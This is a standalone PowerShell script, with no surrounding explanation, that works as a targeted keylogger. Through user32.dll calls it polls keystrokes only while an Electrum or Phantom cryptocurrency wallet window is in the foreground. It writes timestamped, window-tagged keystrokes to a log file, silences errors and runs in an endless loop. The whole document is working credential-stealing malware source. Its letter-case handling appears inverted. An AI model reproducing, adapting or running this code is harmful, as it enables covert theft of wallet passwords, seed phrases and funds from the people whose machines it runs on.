param([string]$Log)

$ErrorActionPreference = 'SilentlyContinue'
Add-Type @"
using System;
using System.Text;
using System.Runtime.InteropServices;
public static class SpcKeys {
    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int key);
    [DllImport("user32.dll")] private static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] private static extern int GetWindowText(IntPtr window, StringBuilder text, int size);
    public static string Title() {
        StringBuilder text = new StringBuilder(512);
        GetWindowText(GetForegroundWindow(), text, text.Capacity);
        return text.ToString();
    }
    public static bool Down(int key) { return (GetAsyncKeyState(key) & 0x8000) != 0; }
}
"@

$keys = @{}
$symbols = @{
    0xBA = ';'; 0xBB = '='; 0xBC = ','; 0xBD = '-'; 0xBE = '.'; 0xBF = '/'
    0xC0 = '`'; 0xDB = '['; 0xDC = '\'; 0xDD = ']'; 0xDE = "'"
}
$shifted = @{
    0xBA = ':'; 0xBB = '+'; 0xBC = '<'; 0xBD = '_'; 0xBE = '>'; 0xBF = '?'
    0xC0 = '~'; 0xDB = '{'; 0xDC = '|'; 0xDD = '}'; 0xDE = '"'
}
$digits = @('1','2','3','4','5','6','7','8','9','0')
$shiftDigits = @('!','@','#','$','%','^','&','*','(',')')

$codes = @(0x08..0x5A) + @(0x60..0x6F) + @(0xBA..0xDE)
$active = $false
$buffer = ''
$lastTitle = ''
$lastFlush = Get-Date

function Flush([bool]$force) {
    $script:lastFlush = Get-Date
    if ($script:buffer.Length -eq 0) { return }
    if (-not $force -and $script:buffer.Length -lt 24) { return }
    Add-Content -LiteralPath $Log -Value "$(Get-Date -Format 'HH:mm:ss') [$script:lastTitle] $script:buffer"
    $script:buffer = ''
}

while ($true) {
    Start-Sleep -Milliseconds 12
    $title = [SpcKeys]::Title()
    $active = $title -match 'Electrum|Phantom'
    if (-not $active) { if ($buffer.Length -or $lastTitle) { Flush $true; $lastTitle = '' }; continue }
    if ($title -ne $lastTitle) { Flush $true; $lastTitle = $title }
    $shift = [SpcKeys]::Down(0x10) -or [SpcKeys]::Down(0xA0) -or [SpcKeys]::Down(0xA1)
    $caps = ([Console]::CapsLock)
    foreach ($code in $codes) {
        $down = [SpcKeys]::Down($code)
        if (-not $down) { $keys[$code] = $false; continue }
        if ($keys[$code]) { continue }
        $keys[$code] = $true
        $char = $null
        if ($code -eq 0x08) { $char = '[<]' }
        elseif ($code -eq 0x09) { $char = '[TAB]' }
        elseif ($code -eq 0x0D) { $char = "`n" }
        elseif ($code -eq 0x20) { $char = ' ' }
        elseif ($code -ge 0x41 -and $code -le 0x5A) {
            $char = [char]$code
            if ($shift -xor $caps) { $char = $char.ToString().ToLower() } else { $char = $char.ToString() }
        }
        elseif ($code -ge 0x30 -and $code -le 0x39) {
            $index = $code - 0x30
            $char = if ($shift) { $shiftDigits[($index + 9) % 10] } else { $digits[($index + 9) % 10] }
        }
        elseif ($code -ge 0x60 -and $code -le 0x69) { $char = ([string]($code - 0x60)) }
        elseif ($symbols.ContainsKey($code)) {
            $char = if ($shift) { $shifted[$code] } else { $symbols[$code] }
        }
        if ($char) { $buffer += $char }
    }
    if (((Get-Date) - $lastFlush).TotalSeconds -ge 2) { Flush $false }
}
